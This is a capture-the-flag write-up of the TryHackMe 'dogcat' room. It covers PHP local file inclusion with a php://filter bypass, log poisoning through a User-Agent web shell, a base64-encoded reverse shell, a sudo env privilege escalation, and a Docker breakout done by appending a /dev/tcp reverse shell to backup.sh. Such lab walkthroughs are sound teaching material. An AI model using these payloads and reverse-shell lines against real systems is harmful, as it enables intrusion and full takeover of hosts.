---
title: "dogcat"
date: 2025-03-21
image: /assets/img/tryhackme/DogCat/DogCat_image.jpg
description: Writeup of the TryHackMe-CTF dogcat
categories: [TryHackMe, Medium]
tags: [linux, rce, phpfilter, docker, lfi]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>dogcat</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/dogcat">https://tryhackme.com/room/dogcat</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge dogcat.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.140.125
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 05:10 EDT
  Nmap scan report for 10.10.140.125
  Host is up (0.039s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 27.54 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80 10.10.140.125
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-21 05:13 EDT
  Nmap scan report for 10.10.140.125
  Host is up (0.042s latency).

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
  |   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
  |_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
  80/tcp open  http    Apache httpd 2.4.38 ((Debian))
  |_http-server-header: Apache/2.4.38 (Debian)
  |_http-title: dogcat
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.09 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

The website displayed an option to choose between dog and cat pictures:

![dogcat Website](/assets/img/tryhackme/DogCat/thm_dogcat_1.jpg)

To gain further insights, I initiated a Gobuster directory enumeration:
```bash
$ gobuster dir --url http://10.10.140.125/ --wordlist /usr/share/wordlists/dirb/common.txt -x txt,html,php
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.140.125/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              html,php,txt
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 278]
  /.hta                 (Status: 403) [Size: 278]
  /.hta.php             (Status: 403) [Size: 278]
  /.hta.txt             (Status: 403) [Size: 278]
  /.htaccess.txt        (Status: 403) [Size: 278]
  /.htaccess.html       (Status: 403) [Size: 278]
  /.hta.html            (Status: 403) [Size: 278]
  /.htaccess            (Status: 403) [Size: 278]
  /.htaccess.php        (Status: 403) [Size: 278]
  /.htpasswd.php        (Status: 403) [Size: 278]
  /.htpasswd.html       (Status: 403) [Size: 278]
  /.htpasswd            (Status: 403) [Size: 278]
  /.htpasswd.txt        (Status: 403) [Size: 278]
  /cat.php              (Status: 200) [Size: 26]
  /cats                 (Status: 301) [Size: 313] [--> http://10.10.140.125/cats/]
  /flag.php             (Status: 200) [Size: 0]
  /index.php            (Status: 200) [Size: 418]
  /index.php            (Status: 200) [Size: 418]
  /server-status        (Status: 403) [Size: 278]
  Progress: 18456 / 18460 (99.98%)
  ===============================================================
  Finished
  ===============================================================
```

While the enumeration was running, I manually explored the website. My attention caught the `view` parameter:
```html
/?view=dog
/?view=cat
```

I attempted to use the parameter for path traversal, but received an error message indicating that a `.php` extension was automatically added:
```html
GET /?view=dog/../../../../../../../../../etc/passwd HTTP/1.1

...include(): Failed opening 'dog/../../../../../../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in <b>/var/www/html/index.php
```

To demonstrate proof of concept, I tried receiving the contents of files which are within the webserver directory. Based on the error message, I deduced that the `index.php` file was in `/var/www/html/`. I also knew there were `dog.php` and `cat.php` files, and that the PHP extension would be appended. To prevent PHP execution, I needed to apply encoding. I successfully used a PHP filter with encoding:
```html
/?view=php://filter/convert.base64-encode/resource=dog

PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K
kali@kali:~/ctf/dogcat$ echo "PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
  <img src="dogs/<?php echo rand(1, 10); ?>.jpg" />

/?view=php://filter/convert.base64-encode/resource=cat

kali@kali:~/ctf/dogcat$ echo "PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
  <img src="cats/<?php echo rand(1, 10); ?>.jpg" />
```

### index.php Analysis

Since I could read files with the PHP extension, I attempted to access the content of `index.php`, but encountered an error message:
```html
/?view=php://filter/convert.base64-encode/resource=index

Sorry, only dogs or cats are allowed.
```

This led me to suspect that the string `dog` or `cat` must be included in the parameter. I bypassed this restriction by first accessing the dogs directory, then navigating to index.php using `../index`:
```html
/?view=php://filter/convert.base64-encode/resource=dog/../index 
```

This bypass allowed me to read the `index.php` file. After decoding the Base64 string, I retrieved the source code:
```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

During the analysis of the source code, two lines stood out to me. The first one was:
```php
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
[...]
include $_GET['view'] . $ext;
```

The variable `$ext` defaults to '.php' when not specified, meaning we could remove the `.php` at the end to ready arbitrary files. The second line was:
```php
if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
```

I already deduced that `dog` or `cat` needed to be part of the the parameter values, but not it was confirmed. To test if the `ext` parameter worked as expected, I set it to `.php` and successfully accessed `flag.php`, allowing me to retrieve the first flag:
```bash
/?ext=.php&view=php://filter/convert.base64-encode/resource=dogs/../flag

kali@kali:~/ctf/dogcat$ echo "PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=" | base64 -d
  <?php
    $flag_1 = "THM{T[removed]a}"
  ?>
```

I also tested leaving the `ext` parameter empty and removing the Base64 encoding, which allowed me to read the `/etc/passwd` file:
```bash
/?ext=&view=dogs/../../../../../../etc/passwd

kali@kali:~/ctf/dogcat$ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgo=" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

## Shell as www-data

With the ability ot read arbitrary files, I continued to enumerate the system and successfully accessed the webserver log file at `/var/log/apache2/access.log`:

![Webserver Access Log](/assets/img/tryhackme/DogCat/thm_dogcat_2.jpg)

Having access to the log file, I attempted to gain Remote Code Execution (RCE). First, I intercepted a request to the website using Burp Suite and modified my User-Agent to the following:
```html
User-Agent: <?php system($_GET['c']); ?>
```

Next, I accessed the logs again, but this time I added a `c` parameter to the request and tested whether I could execute the `id` command: 
```html
/?ext=&view=dogs/../../../../../../var/log/apache2/access.log&c=id 

[attackerip] - - [21/Mar/2025:10:48:26 +0000] "GET / HTTP/1.1" 200 537 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Success! I was able to execute the commands by injecting them via the `c` parameter. To gain initial access, I started Penelope and inserted the predefined payload in the `c` parameter. Before sending the request to the server, I used a Burp Suite plugin called Hexavector to apply URL encoding to the payload:
```html
/?ext=&view=dogs/../../../../../../var/log/apache2/access.log&c=<@urlencode>echo c2V0c2lkIGJhc2ggPiYgL2Rldi90Y3AvW2F0dGFja2VyaXBdLzkwMDEgMD4mMSAm|base64 -d|bash</@urlencode> 

www-data@ead7c77f47a7:/home$
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Docker Container Breakout

The first thing I noticed was that the machine name suggested it was likely a Docker container:
```bash
www-data@ead7c77f47a7:/home$
```

While enumerating the system to escalate privileges, I retrieved the second flag:
```bash
www-data@ead7c77f47a7:/var/www$ cat flag2_QMW7JvaY2LvK.txt 
THM{L[removed]b}
```

Next, I ran `sudo -l` which gave me the following output:
```bash
www-data@ead7c77f47a7:/tmp$ sudo -l
Matching Defaults entries for www-data on ead7c77f47a7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on ead7c77f47a7:
    (root) NOPASSWD: /usr/bin/env
```

A quick search on <a href="https://gtfobins.github.io/gtfobins/env/#shell">GTFObins</a> gave me all I needed:
```bash
www-data@ead7c77f47a7:/tmp$ sudo /usr/bin/env /bin/bash
root@ead7c77f47a7:/tmp# id
  uid=0(root) gid=0(root) groups=0(root)    
```

Although I was still inside the Docker container, I was able to retrieve the root flag:
```bash
root@ead7c77f47a7:/tmp# cd /root
root@ead7c77f47a7:~# ls
  flag3.txt
root@ead7c77f47a7:~# cat flag3.txt 
  THM{D[removed]2}
```

The `/opt` directory contained an interesting script called `backup.sh`
```bash
www-data@ead7c77f47a7:/opt/backups$ cat backup.sh 
  #!/bin/bash
  tar cf /root/container/backup/backup.tar /root/container
```

It seemed likely that the backup script could get executed from outside the Docker container. Since both the source and destination directories included the `/root` path, it implied high privileges. I set up another Penelope listener on port 4444 and inserted a reverse shell inside the `backup.sh` script:
```bash
root@ead7c77f47a7:/opt/backups# echo "bash -i >& /dev/tcp/[attackerip]/4444 0>&1" >> backup.sh
```

After a few seconds, I received the reverse shell and successfully broke out of the Docker instance. With the access, I was able to retrieve the final flag:
```bash
root@dogcat:~# ls
  container  flag4.txt
root@dogcat:~# cat flag4.txt 
  THM{e[removed]d}
```

solved! :)